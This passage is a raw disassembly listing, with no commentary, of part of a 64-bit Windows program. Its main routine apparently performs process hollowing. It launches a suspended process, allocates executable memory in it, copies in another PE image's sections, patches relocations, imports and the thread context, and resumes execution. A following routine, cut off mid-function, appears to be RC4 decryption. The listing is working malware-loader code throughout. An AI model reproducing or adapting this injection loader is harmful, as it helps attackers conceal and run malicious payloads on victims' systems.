   140002c6d:	48 8d 0d 2c 2b 00 00 	lea    0x2b2c(%rip),%rcx        # 0x1400057a0
   140002c74:	e8 37 fc ff ff       	call   0x1400028b0
   140002c79:	49 89 c5             	mov    %rax,%r13
   140002c7c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140002c81:	48 8d 0d 38 2b 00 00 	lea    0x2b38(%rip),%rcx        # 0x1400057c0
   140002c88:	e8 23 fc ff ff       	call   0x1400028b0
   140002c8d:	49 89 c4             	mov    %rax,%r12
   140002c90:	48 8d 0d 39 2b 00 00 	lea    0x2b39(%rip),%rcx        # 0x1400057d0
   140002c97:	e8 14 fc ff ff       	call   0x1400028b0
   140002c9c:	49 89 c7             	mov    %rax,%r15
   140002c9f:	48 8d 0d 4a 2b 00 00 	lea    0x2b4a(%rip),%rcx        # 0x1400057f0
   140002ca6:	e8 05 fc ff ff       	call   0x1400028b0
   140002cab:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002cb0:	48 8d 0d 49 2b 00 00 	lea    0x2b49(%rip),%rcx        # 0x140005800
   140002cb7:	e8 f4 fb ff ff       	call   0x1400028b0
   140002cbc:	48 89 c1             	mov    %rax,%rcx
   140002cbf:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002cc4:	48 85 f6             	test   %rsi,%rsi
   140002cc7:	0f 95 c0             	setne  %al
   140002cca:	48 85 db             	test   %rbx,%rbx
   140002ccd:	0f 95 c2             	setne  %dl
   140002cd0:	21 d0                	and    %edx,%eax
   140002cd2:	48 85 ff             	test   %rdi,%rdi
   140002cd5:	0f 95 c2             	setne  %dl
   140002cd8:	21 d0                	and    %edx,%eax
   140002cda:	4d 85 ed             	test   %r13,%r13
   140002cdd:	0f 95 c2             	setne  %dl
   140002ce0:	21 d0                	and    %edx,%eax
   140002ce2:	4d 85 e4             	test   %r12,%r12
   140002ce5:	0f 95 c2             	setne  %dl
   140002ce8:	21 d0                	and    %edx,%eax
   140002cea:	4d 85 ff             	test   %r15,%r15
   140002ced:	0f 95 c2             	setne  %dl
   140002cf0:	21 d0                	and    %edx,%eax
   140002cf2:	48 83 7c 24 78 00    	cmpq   $0x0,0x78(%rsp)
   140002cf8:	0f 95 c2             	setne  %dl
   140002cfb:	84 d0                	test   %dl,%al
   140002cfd:	0f 84 4f 06 00 00    	je     0x140003352
   140002d03:	48 85 c9             	test   %rcx,%rcx
   140002d06:	0f 84 46 06 00 00    	je     0x140003352
   140002d0c:	bf 00 00 00 00       	mov    $0x0,%edi
   140002d11:	66 41 81 3e 4d 5a    	cmpw   $0x5a4d,(%r14)
   140002d17:	0f 85 95 06 00 00    	jne    0x1400033b2
   140002d1d:	49 63 46 3c          	movslq 0x3c(%r14),%rax
   140002d21:	4d 8d 2c 06          	lea    (%r14,%rax,1),%r13
   140002d25:	41 81 7d 00 50 45 00 	cmpl   $0x4550,0x0(%r13)
   140002d2c:	00 
   140002d2d:	0f 85 7f 06 00 00    	jne    0x1400033b2
   140002d33:	48 8d 94 24 90 05 00 	lea    0x590(%rsp),%rdx
   140002d3a:	00 
   140002d3b:	48 c7 84 24 94 05 00 	movq   $0x0,0x594(%rsp)
   140002d42:	00 00 00 00 00 
   140002d47:	48 c7 84 24 f0 05 00 	movq   $0x0,0x5f0(%rsp)
   140002d4e:	00 00 00 00 00 
   140002d53:	48 8d bc 24 98 05 00 	lea    0x598(%rsp),%rdi
   140002d5a:	00 
   140002d5b:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140002d60:	b8 00 00 00 00       	mov    $0x0,%eax
   140002d65:	f3 48 ab             	rep stos %rax,(%rdi)
   140002d68:	48 8d 84 24 70 05 00 	lea    0x570(%rsp),%rax
   140002d6f:	00 
   140002d70:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140002d74:	0f 11 84 24 70 05 00 	movups %xmm0,0x570(%rsp)
   140002d7b:	00 
   140002d7c:	48 c7 84 24 80 05 00 	movq   $0x0,0x580(%rsp)
   140002d83:	00 00 00 00 00 
   140002d88:	c7 84 24 90 05 00 00 	movl   $0x68,0x590(%rsp)
   140002d8f:	68 00 00 00 
   140002d93:	c7 84 24 cc 05 00 00 	movl   $0x1,0x5cc(%rsp)
   140002d9a:	01 00 00 00 
   140002d9e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002da3:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002da8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140002daf:	00 00 
   140002db1:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002db8:	00 00 
   140002dba:	c7 44 24 28 04 00 00 	movl   $0x8000004,0x28(%rsp)
   140002dc1:	08 
   140002dc2:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140002dc9:	00 
   140002dca:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140002dd0:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140002dd6:	ba 00 00 00 00       	mov    $0x0,%edx
   140002ddb:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140002ddf:	ff 15 cb 64 00 00    	call   *0x64cb(%rip)        # 0x1400092b0
   140002de5:	89 c7                	mov    %eax,%edi
   140002de7:	85 c0                	test   %eax,%eax
   140002de9:	0f 84 c3 05 00 00    	je     0x1400033b2
   140002def:	c7 84 24 d0 00 00 00 	movl   $0x10000b,0xd0(%rsp)
   140002df6:	0b 00 10 00 
   140002dfa:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
   140002e01:	00 
   140002e02:	48 8b 8c 24 78 05 00 	mov    0x578(%rsp),%rcx
   140002e09:	00 
   140002e0a:	ff d6                	call   *%rsi
   140002e0c:	89 c7                	mov    %eax,%edi
   140002e0e:	85 c0                	test   %eax,%eax
   140002e10:	0f 84 c7 00 00 00    	je     0x140002edd
   140002e16:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   140002e1d:	00 00 00 00 00 
   140002e22:	48 8b 84 24 28 01 00 	mov    0x128(%rsp),%rax
   140002e29:	00 
   140002e2a:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140002e2e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002e35:	00 00 
   140002e37:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140002e3d:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140002e44:	00 
   140002e45:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002e4c:	00 
   140002e4d:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002e52:	ff d0                	call   *%rax
   140002e54:	48 8b 94 24 98 00 00 	mov    0x98(%rsp),%rdx
   140002e5b:	00 
   140002e5c:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002e63:	00 
   140002e64:	ff d3                	call   *%rbx
   140002e66:	49 8b 7d 30          	mov    0x30(%r13),%rdi
   140002e6a:	41 8b 75 54          	mov    0x54(%r13),%esi
   140002e6e:	41 8b 5d 50          	mov    0x50(%r13),%ebx
   140002e72:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002e79:	00 
   140002e7a:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140002e80:	49 89 d8             	mov    %rbx,%r8
   140002e83:	48 89 fa             	mov    %rdi,%rdx
   140002e86:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002e8d:	00 
   140002e8e:	41 ff d4             	call   *%r12
   140002e91:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140002e98:	00 
   140002e99:	48 85 c0             	test   %rax,%rax
   140002e9c:	74 58                	je     0x140002ef6
   140002e9e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002ea5:	00 00 
   140002ea7:	41 89 f1             	mov    %esi,%r9d
   140002eaa:	4d 89 f0             	mov    %r14,%r8
   140002ead:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   140002eb4:	00 
   140002eb5:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002ebc:	00 
   140002ebd:	41 ff d7             	call   *%r15
   140002ec0:	41 0f b7 45 14       	movzwl 0x14(%r13),%eax
   140002ec5:	49 8d 5c 05 18       	lea    0x18(%r13,%rax,1),%rbx
   140002eca:	66 41 83 7d 06 00    	cmpw   $0x0,0x6(%r13)
   140002ed0:	0f 84 b2 00 00 00    	je     0x140002f88
   140002ed6:	be 00 00 00 00       	mov    $0x0,%esi
   140002edb:	eb 77                	jmp    0x140002f54
   140002edd:	ba 00 00 00 00       	mov    $0x0,%edx
   140002ee2:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002ee9:	00 
   140002eea:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140002eef:	ff d0                	call   *%rax
   140002ef1:	e9 bc 04 00 00       	jmp    0x1400033b2
   140002ef6:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002efd:	00 
   140002efe:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   140002f04:	49 89 d8             	mov    %rbx,%r8
   140002f07:	ba 00 00 00 00       	mov    $0x0,%edx
   140002f0c:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002f13:	00 
   140002f14:	41 ff d4             	call   *%r12
   140002f17:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140002f1e:	00 
   140002f1f:	48 85 c0             	test   %rax,%rax
   140002f22:	0f 85 76 ff ff ff    	jne    0x140002e9e
   140002f28:	ba 00 00 00 00       	mov    $0x0,%edx
   140002f2d:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002f34:	00 
   140002f35:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140002f3a:	ff d0                	call   *%rax
   140002f3c:	bf 00 00 00 00       	mov    $0x0,%edi
   140002f41:	e9 6c 04 00 00       	jmp    0x1400033b2
   140002f46:	83 c6 01             	add    $0x1,%esi
   140002f49:	48 83 c3 28          	add    $0x28,%rbx
   140002f4d:	66 41 3b 75 06       	cmp    0x6(%r13),%si
   140002f52:	73 34                	jae    0x140002f88
   140002f54:	44 8b 4b 10          	mov    0x10(%rbx),%r9d
   140002f58:	45 85 c9             	test   %r9d,%r9d
   140002f5b:	74 e9                	je     0x140002f46
   140002f5d:	8b 43 14             	mov    0x14(%rbx),%eax
   140002f60:	8b 53 0c             	mov    0xc(%rbx),%edx
   140002f63:	48 03 94 24 90 00 00 	add    0x90(%rsp),%rdx
   140002f6a:	00 
   140002f6b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002f72:	00 00 
   140002f74:	45 89 c9             	mov    %r9d,%r9d
   140002f77:	4d 8d 04 06          	lea    (%r14,%rax,1),%r8
   140002f7b:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002f82:	00 
   140002f83:	41 ff d7             	call   *%r15
   140002f86:	eb be                	jmp    0x140002f46
   140002f88:	48 8b 84 24 28 01 00 	mov    0x128(%rsp),%rax
   140002f8f:	00 
   140002f90:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140002f94:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002f9b:	00 00 
   140002f9d:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140002fa3:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140002faa:	00 
   140002fab:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140002fb2:	00 
   140002fb3:	41 ff d7             	call   *%r15
   140002fb6:	41 8b 45 28          	mov    0x28(%r13),%eax
   140002fba:	48 03 84 24 90 00 00 	add    0x90(%rsp),%rax
   140002fc1:	00 
   140002fc2:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   140002fc9:	00 
   140002fca:	48 8d 94 24 a0 00 00 	lea    0xa0(%rsp),%rdx
   140002fd1:	00 
   140002fd2:	48 8b 8c 24 78 05 00 	mov    0x578(%rsp),%rcx
   140002fd9:	00 
   140002fda:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140002fdf:	ff d0                	call   *%rax
   140002fe1:	41 83 bd 94 00 00 00 	cmpl   $0x0,0x94(%r13)
   140002fe8:	00 
   140002fe9:	0f 85 09 01 00 00    	jne    0x1400030f8
   140002fef:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140002ff6:	00 
   140002ff7:	48 39 f8             	cmp    %rdi,%rax
   140002ffa:	74 0e                	je     0x14000300a
   140002ffc:	41 83 bd b4 00 00 00 	cmpl   $0x0,0xb4(%r13)
   140003003:	00 
   140003004:	0f 85 2b 02 00 00    	jne    0x140003235
   14000300a:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140003011:	00 00 00 00 00 
   140003016:	48 8b 84 24 28 01 00 	mov    0x128(%rsp),%rax
   14000301d:	00 
   14000301e:	48 8d 50 20          	lea    0x20(%rax),%rdx
   140003022:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003029:	00 00 
   14000302b:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140003031:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
   140003038:	00 
   140003039:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   140003040:	00 
   140003041:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003046:	ff d0                	call   *%rax
   140003048:	48 8b 94 24 88 00 00 	mov    0x88(%rsp),%rdx
   14000304f:	00 
   140003050:	48 85 d2             	test   %rdx,%rdx
   140003053:	74 6f                	je     0x1400030c4
   140003055:	c7 84 24 84 00 00 00 	movl   $0x1,0x84(%rsp)
   14000305c:	01 00 00 00 
   140003060:	66 c7 84 24 82 00 00 	movw   $0x1,0x82(%rsp)
   140003067:	00 01 00 
   14000306a:	48 81 c2 a4 00 00 00 	add    $0xa4,%rdx
   140003071:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003078:	00 00 
   14000307a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003080:	4c 8d 84 24 84 00 00 	lea    0x84(%rsp),%r8
   140003087:	00 
   140003088:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   14000308f:	00 
   140003090:	41 ff d7             	call   *%r15
   140003093:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000309a:	00 
   14000309b:	48 8d 90 a8 00 00 00 	lea    0xa8(%rax),%rdx
   1400030a2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400030a9:	00 00 
   1400030ab:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400030b1:	4c 8d 84 24 82 00 00 	lea    0x82(%rsp),%r8
   1400030b8:	00 
   1400030b9:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400030c0:	00 
   1400030c1:	41 ff d7             	call   *%r15
   1400030c4:	48 8b 8c 24 78 05 00 	mov    0x578(%rsp),%rcx
   1400030cb:	00 
   1400030cc:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400030d1:	ff d0                	call   *%rax
   1400030d3:	48 8b 8c 24 78 05 00 	mov    0x578(%rsp),%rcx
   1400030da:	00 
   1400030db:	48 8b 1d be 61 00 00 	mov    0x61be(%rip),%rbx        # 0x1400092a0
   1400030e2:	ff d3                	call   *%rbx
   1400030e4:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400030eb:	00 
   1400030ec:	ff d3                	call   *%rbx
   1400030ee:	bf 01 00 00 00       	mov    $0x1,%edi
   1400030f3:	e9 ba 02 00 00       	jmp    0x1400033b2
   1400030f8:	41 8b 95 90 00 00 00 	mov    0x90(%r13),%edx
   1400030ff:	4c 89 e9             	mov    %r13,%rcx
   140003102:	e8 f9 0c 00 00       	call   0x140003e00
   140003107:	89 c0                	mov    %eax,%eax
   140003109:	4c 01 f0             	add    %r14,%rax
   14000310c:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003111:	8b 50 0c             	mov    0xc(%rax),%edx
   140003114:	85 d2                	test   %edx,%edx
   140003116:	0f 84 d3 fe ff ff    	je     0x140002fef
   14000311c:	48 8b 05 d5 61 00 00 	mov    0x61d5(%rip),%rax        # 0x1400092f8
   140003123:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003128:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   14000312d:	eb 27                	jmp    0x140003156
   14000312f:	48 89 d9             	mov    %rbx,%rcx
   140003132:	ff 15 00 62 00 00    	call   *0x6200(%rip)        # 0x140009338
   140003138:	48 89 c6             	mov    %rax,%rsi
   14000313b:	48 85 c0             	test   %rax,%rax
   14000313e:	75 35                	jne    0x140003175
   140003140:	48 83 44 24 60 14    	addq   $0x14,0x60(%rsp)
   140003146:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000314b:	8b 50 0c             	mov    0xc(%rax),%edx
   14000314e:	85 d2                	test   %edx,%edx
   140003150:	0f 84 d5 00 00 00    	je     0x14000322b
   140003156:	4c 89 e9             	mov    %r13,%rcx
   140003159:	e8 a2 0c 00 00       	call   0x140003e00
   14000315e:	89 c3                	mov    %eax,%ebx
   140003160:	4c 01 f3             	add    %r14,%rbx
   140003163:	48 89 d9             	mov    %rbx,%rcx
   140003166:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   14000316b:	ff d0                	call   *%rax
   14000316d:	48 89 c6             	mov    %rax,%rsi
   140003170:	48 85 c0             	test   %rax,%rax
   140003173:	74 ba                	je     0x14000312f
   140003175:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000317a:	8b 10                	mov    (%rax),%edx
   14000317c:	85 d2                	test   %edx,%edx
   14000317e:	75 03                	jne    0x140003183
   140003180:	8b 50 10             	mov    0x10(%rax),%edx
   140003183:	4c 89 e9             	mov    %r13,%rcx
   140003186:	e8 75 0c 00 00       	call   0x140003e00
   14000318b:	89 c1                	mov    %eax,%ecx
   14000318d:	49 8d 3c 0e          	lea    (%r14,%rcx,1),%rdi
   140003191:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003196:	44 8b 60 10          	mov    0x10(%rax),%r12d
   14000319a:	48 8b 07             	mov    (%rdi),%rax
   14000319d:	48 85 c0             	test   %rax,%rax
   1400031a0:	74 9e                	je     0x140003140
   1400031a2:	4c 89 e3             	mov    %r12,%rbx
   1400031a5:	48 8d 94 24 88 00 00 	lea    0x88(%rsp),%rdx
   1400031ac:	00 
   1400031ad:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   1400031b2:	48 89 c2             	mov    %rax,%rdx
   1400031b5:	eb 55                	jmp    0x14000320c
   1400031b7:	0f b7 d2             	movzwl %dx,%edx
   1400031ba:	48 89 f1             	mov    %rsi,%rcx
   1400031bd:	ff 15 3d 61 00 00    	call   *0x613d(%rip)        # 0x140009300
   1400031c3:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   1400031ca:	00 
   1400031cb:	48 89 da             	mov    %rbx,%rdx
   1400031ce:	48 03 94 24 90 00 00 	add    0x90(%rsp),%rdx
   1400031d5:	00 
   1400031d6:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400031dd:	00 00 
   1400031df:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400031e5:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1400031ea:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400031f1:	00 
   1400031f2:	41 ff d7             	call   *%r15
   1400031f5:	48 83 c3 08          	add    $0x8,%rbx
   1400031f9:	48 89 f8             	mov    %rdi,%rax
   1400031fc:	4c 29 e0             	sub    %r12,%rax
   1400031ff:	48 8b 14 18          	mov    (%rax,%rbx,1),%rdx
   140003203:	48 85 d2             	test   %rdx,%rdx
   140003206:	0f 84 34 ff ff ff    	je     0x140003140
   14000320c:	48 85 d2             	test   %rdx,%rdx
   14000320f:	78 a6                	js     0x1400031b7
   140003211:	4c 89 e9             	mov    %r13,%rcx
   140003214:	e8 e7 0b 00 00       	call   0x140003e00
   140003219:	89 c0                	mov    %eax,%eax
   14000321b:	49 8d 54 06 02       	lea    0x2(%r14,%rax,1),%rdx
   140003220:	48 89 f1             	mov    %rsi,%rcx
   140003223:	ff 15 d7 60 00 00    	call   *0x60d7(%rip)        # 0x140009300
   140003229:	eb 98                	jmp    0x1400031c3
   14000322b:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003230:	e9 ba fd ff ff       	jmp    0x140002fef
   140003235:	48 29 f8             	sub    %rdi,%rax
   140003238:	48 89 c3             	mov    %rax,%rbx
   14000323b:	41 8b 95 b0 00 00 00 	mov    0xb0(%r13),%edx
   140003242:	4c 89 e9             	mov    %r13,%rcx
   140003245:	e8 b6 0b 00 00       	call   0x140003e00
   14000324a:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%rsp)
   140003251:	00 
   140003252:	89 c6                	mov    %eax,%esi
   140003254:	4c 8d a4 24 88 00 00 	lea    0x88(%rsp),%r12
   14000325b:	00 
   14000325c:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   140003261:	49 89 dd             	mov    %rbx,%r13
   140003264:	4c 89 75 10          	mov    %r14,0x10(%rbp)
   140003268:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   14000326d:	e9 a4 00 00 00       	jmp    0x140003316
   140003272:	48 83 c3 02          	add    $0x2,%rbx
   140003276:	48 39 df             	cmp    %rbx,%rdi
   140003279:	74 7f                	je     0x1400032fa
   14000327b:	0f b7 03             	movzwl (%rbx),%eax
   14000327e:	89 c2                	mov    %eax,%edx
   140003280:	66 c1 ea 0c          	shr    $0xc,%dx
   140003284:	66 83 fa 0a          	cmp    $0xa,%dx
   140003288:	75 e8                	jne    0x140003272
   14000328a:	44 8b 36             	mov    (%rsi),%r14d
   14000328d:	4c 03 b4 24 90 00 00 	add    0x90(%rsp),%r14
   140003294:	00 
   140003295:	25 ff 0f 00 00       	and    $0xfff,%eax
   14000329a:	49 01 c6             	add    %rax,%r14
   14000329d:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   1400032a4:	00 00 00 00 00 
   1400032a9:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400032b0:	00 00 
   1400032b2:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400032b8:	4d 89 e0             	mov    %r12,%r8
   1400032bb:	4c 89 f2             	mov    %r14,%rdx
   1400032be:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400032c5:	00 
   1400032c6:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400032cb:	ff d0                	call   *%rax
   1400032cd:	4c 01 ac 24 88 00 00 	add    %r13,0x88(%rsp)
   1400032d4:	00 
   1400032d5:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400032dc:	00 00 
   1400032de:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400032e4:	4d 89 e0             	mov    %r12,%r8
   1400032e7:	4c 89 f2             	mov    %r14,%rdx
   1400032ea:	48 8b 8c 24 70 05 00 	mov    0x570(%rsp),%rcx
   1400032f1:	00 
   1400032f2:	41 ff d7             	call   *%r15
   1400032f5:	e9 78 ff ff ff       	jmp    0x140003272
   1400032fa:	8b 44 24 68          	mov    0x68(%rsp),%eax
   1400032fe:	03 46 04             	add    0x4(%rsi),%eax
   140003301:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140003305:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000330a:	3b 86 b4 00 00 00    	cmp    0xb4(%rsi),%eax
   140003310:	0f 83 f4 fc ff ff    	jae    0x14000300a
   140003316:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   14000331a:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000331f:	48 01 c1             	add    %rax,%rcx
   140003322:	48 89 ce             	mov    %rcx,%rsi
   140003325:	48 03 75 10          	add    0x10(%rbp),%rsi
   140003329:	8b 46 04             	mov    0x4(%rsi),%eax
   14000332c:	85 c0                	test   %eax,%eax
   14000332e:	0f 84 d6 fc ff ff    	je     0x14000300a
   140003334:	89 c0                	mov    %eax,%eax
   140003336:	48 83 e8 08          	sub    $0x8,%rax
   14000333a:	48 d1 e8             	shr    $1,%rax
   14000333d:	85 c0                	test   %eax,%eax
   14000333f:	74 b9                	je     0x1400032fa
   140003341:	48 8d 5e 08          	lea    0x8(%rsi),%rbx
   140003345:	8d 40 ff             	lea    -0x1(%rax),%eax
   140003348:	48 8d 7c 46 0a       	lea    0xa(%rsi,%rax,2),%rdi
   14000334d:	e9 29 ff ff ff       	jmp    0x14000327b
   140003352:	bf 00 00 00 00       	mov    $0x0,%edi
   140003357:	eb 59                	jmp    0x1400033b2
   140003359:	48 8d 0d 00 24 00 00 	lea    0x2400(%rip),%rcx        # 0x140005760
   140003360:	e8 4b f5 ff ff       	call   0x1400028b0
   140003365:	48 8d 0d 14 24 00 00 	lea    0x2414(%rip),%rcx        # 0x140005780
   14000336c:	e8 3f f5 ff ff       	call   0x1400028b0
   140003371:	48 8d 0d 28 24 00 00 	lea    0x2428(%rip),%rcx        # 0x1400057a0
   140003378:	e8 33 f5 ff ff       	call   0x1400028b0
   14000337d:	48 8d 0d 3c 24 00 00 	lea    0x243c(%rip),%rcx        # 0x1400057c0
   140003384:	e8 27 f5 ff ff       	call   0x1400028b0
   140003389:	48 8d 0d 40 24 00 00 	lea    0x2440(%rip),%rcx        # 0x1400057d0
   140003390:	e8 1b f5 ff ff       	call   0x1400028b0
   140003395:	48 8d 0d 54 24 00 00 	lea    0x2454(%rip),%rcx        # 0x1400057f0
   14000339c:	e8 0f f5 ff ff       	call   0x1400028b0
   1400033a1:	48 8d 0d 58 24 00 00 	lea    0x2458(%rip),%rcx        # 0x140005800
   1400033a8:	e8 03 f5 ff ff       	call   0x1400028b0
   1400033ad:	bf 00 00 00 00       	mov    $0x0,%edi
   1400033b2:	89 f8                	mov    %edi,%eax
   1400033b4:	48 8d 65 c8          	lea    -0x38(%rbp),%rsp
   1400033b8:	5b                   	pop    %rbx
   1400033b9:	5e                   	pop    %rsi
   1400033ba:	5f                   	pop    %rdi
   1400033bb:	41 5c                	pop    %r12
   1400033bd:	41 5d                	pop    %r13
   1400033bf:	41 5e                	pop    %r14
   1400033c1:	41 5f                	pop    %r15
   1400033c3:	5d                   	pop    %rbp
   1400033c4:	c3                   	ret
   1400033c5:	90                   	nop
   1400033c6:	90                   	nop
   1400033c7:	90                   	nop
   1400033c8:	90                   	nop
   1400033c9:	90                   	nop
   1400033ca:	90                   	nop
   1400033cb:	90                   	nop
   1400033cc:	90                   	nop
   1400033cd:	90                   	nop
   1400033ce:	90                   	nop
   1400033cf:	90                   	nop
   1400033d0:	55                   	push   %rbp
   1400033d1:	48 89 e5             	mov    %rsp,%rbp
   1400033d4:	57                   	push   %rdi
   1400033d5:	56                   	push   %rsi
   1400033d6:	53                   	push   %rbx
   1400033d7:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   1400033db:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   1400033e2:	48 89 cb             	mov    %rcx,%rbx
   1400033e5:	89 d6                	mov    %edx,%esi
   1400033e7:	b8 00 00 00 00       	mov    $0x0,%eax
   1400033ec:	88 04 04             	mov    %al,(%rsp,%rax,1)
   1400033ef:	48 83 c0 01          	add    $0x1,%rax
   1400033f3:	48 3d 00 01 00 00    	cmp    $0x100,%rax
   1400033f9:	75 f1                	jne    0x1400033ec
   1400033fb:	49 89 e2             	mov    %rsp,%r10
   1400033fe:	41 bb 00 00 00 00    	mov    $0x0,%r11d
   140003404:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003409:	41 0f b6 3a          	movzbl (%r10),%edi
   14000340d:	89 c8                	mov    %ecx,%eax
   14000340f:	ba 00 00 00 00       	mov    $0x0,%edx
   140003414:	41 f7 f1             	div    %r9d
   140003417:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
   14000341c:	40 0f b6 d7          	movzbl %dil,%edx
   140003420:	01 d0                	add    %edx,%eax
   140003422:	44 01 d8             	add    %r11d,%eax
   140003425:	44 0f b6 d8          	movzbl %al,%r11d
   140003429:	44 89 d8             	mov    %r11d,%eax
   14000342c:	0f b6 14 04          	movzbl (%rsp,%rax,1),%edx
   140003430:	41 88 12             	mov    %dl,(%r10)
   140003433:	40 88 3c 04          	mov    %dil,(%rsp,%rax,1)
   140003437:	83 c1 01             	add    $0x1,%ecx
   14000343a:	49 83 c2 01          	add    $0x1,%r10
   14000343e:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
   140003444:	75 c3                	jne    0x140003409
   140003446:	85 f6                	test   %esi,%esi
   140003448:	74 4c                	je     0x140003496
   14000344a:	49 89 d8             	mov    %rbx,%r8
   14000344d:	89 f6                	mov    %esi,%esi
   14000344f:	48 01 f3             	add    %rsi,%rbx
   140003452:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003457:	ba 00 00 00 00       	mov    $0x0,%edx
   14000345c:	83 c2 01             	add    $0x1,%edx
   14000345f:	0f b6 d2             	movzbl %dl,%edx
   140003462:	41 89 d1             	mov    %edx,%r9d
   140003465:	42 0f b6 04 0c       	movzbl (%rsp,%r9,1),%eax
   14000346a:	01 c1                	add    %eax,%ecx
   14000346c:	0f b6 c9             	movzbl %cl,%ecx
   14000346f:	41 89 ca             	mov    %ecx,%r10d
   140003472:	46 0f b6 1c 14       	movzbl (%rsp,%r10,1),%r11d
   140003477:	46 88 1c 0c          	mov    %r11b,(%rsp,%r9,1)
